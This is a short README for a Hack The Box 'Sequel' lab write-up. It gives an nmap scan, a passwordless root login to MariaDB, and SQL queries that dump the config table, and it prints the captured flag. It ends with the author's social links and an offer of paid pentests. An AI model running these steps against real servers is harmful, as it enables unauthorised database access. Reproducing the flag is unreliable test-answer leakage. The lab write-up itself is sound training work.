# HTB “Sequel” MariaDB Exploit

Directly access the MariaDB service on the Sequel machine to enumerate and retrieve the flag.

## Quick Start

```
git clone https://github.com/keyfive5/obsidiansignal-htb-sequel.git
cd obsidiansignal-htb-sequel
bash scripts/enum-mysql.sh 10.129.28.113
```

# Prerequisites
mysql-client (MariaDB or MySQL)

HTB VPN connection

# Repo Layout
writeup/ – Markdown & PDF report

scripts/enum-mysql.sh – Bash automation

screenshots/ – proof of each step

articles/ – Dev.to markdown

# Lab Steps
Scan: nmap -sC -sV -p3306 $IP

# Connect: mysql --ssl -h $IP -u root --skip-ssl

Enumerate:

SHOW DATABASES;
USE htb;
SHOW TABLES;
SELECT * FROM config;
Flag: 7b4bec00d1a39e3dd4e021ec3d915da8

Connect
Dev.to: https://dev.to/keyfive5

Twitter: https://twitter.com/keyfive5

LinkedIn: your‑linkedin‑url

“Looking for paid DB pentests or cloud‑infra security engagements? Let’s chat!”
